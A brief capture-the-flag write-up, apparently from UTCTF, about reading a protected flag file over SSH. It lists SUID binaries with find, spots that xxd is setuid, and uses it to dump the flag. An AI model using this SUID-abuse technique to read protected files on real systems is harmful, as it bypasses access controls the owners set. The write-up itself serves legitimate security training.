# Setup

We are given ssh access as user `trapped` and the `flag.txt` just sits
in plain sight but we don't have the correct permissions to read it.

# Solve

Poking around the system for clues:

```sh
trapped@47ca6c33ca55:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/xxd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

`xxd` seems out of place and lets us read the flag

```sh
trapped@47ca6c33ca55:~$ xxd flag.txt
00000000: 7574 666c 6167 7b53 7065 6369 614c 5f50  utflag{SpeciaL_P
00000010: 6572 6d69 7373 696f 6e7a 7d0a            ermissionz}.
```
